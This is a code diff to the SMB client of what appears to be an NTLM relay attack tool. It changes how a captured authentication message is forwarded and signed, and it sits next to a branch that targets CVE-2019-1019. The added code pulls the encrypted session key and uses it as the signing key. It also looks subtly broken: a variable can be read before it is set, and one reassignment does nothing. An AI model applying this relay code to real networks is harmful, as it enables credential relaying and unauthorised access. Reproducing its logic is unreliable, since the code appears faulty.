@@ -536,14 +536,6 @@ class SMBRelayClient(ProtocolClient):
             authMessage.fromString(authenticateMessageBlob)
             LOG.debug('[SMB] sendAuth: Successfully parsed NTLM message')
 
-            # Debug: Show username/domain from NTLM message
-            try:
-                username = authMessage['user_name'].decode('utf-16le') if authMessage['user_name'] else ''
-                domain = authMessage['domain_name'].decode('utf-16le') if authMessage['domain_name'] else ''
-                LOG.debug('[SMB] sendAuth: NTLM message contains: domain=%s, user=%s' % (domain, username))
-            except:
-                LOG.debug('[SMB] sendAuth: Could not decode username/domain from NTLM message')
-
             original_flags = authMessage['flags']
             LOG.debug('[SMB] sendAuth: Original auth flags: 0x%x' % original_flags)
 
@@ -555,6 +547,16 @@ class SMBRelayClient(ProtocolClient):
             # Do NOT zero out MIC or Version fields - keep NTLM3 message intact
 
             LOG.debug('[SMB] sendAuth: Modified auth flags: 0x%x, MIC intact' % authMessage['flags'])
+
+            # Extract the encrypted session key from the NTLM message
+            # For local SYSTEM auth, we can use this directly as the signing key
+            if authMessage['session_key']:
+                signingKey = authMessage['session_key']
+                LOG.debug('[SMB] sendAuth: Extracted session key from NTLM message, length: %d' % len(signingKey))
+            else:
+                LOG.debug('[SMB] sendAuth: No session key in NTLM message')
+                signingKey = None
+
             authenticateMessageBlob = authMessage.getData()
 
         #if unpack('B', str(authenticateMessageBlob)[:1])[0] == SPNEGO_NegTokenResp.SPNEGO_NEG_TOKEN_RESP:
@@ -565,7 +567,8 @@ class SMBRelayClient(ProtocolClient):
         authData = authenticateMessageBlob
         LOG.debug('[SMB] sendAuth: authData prepared, length: %d' % len(authData))
 
-        signingKey = None
+        if not signingKey:
+            signingKey = None
         if self.serverConfig.remove_target:
             LOG.debug('[SMB] sendAuth: Using --remove-target, calculating signing key')
             # Trying to exploit CVE-2019-1019
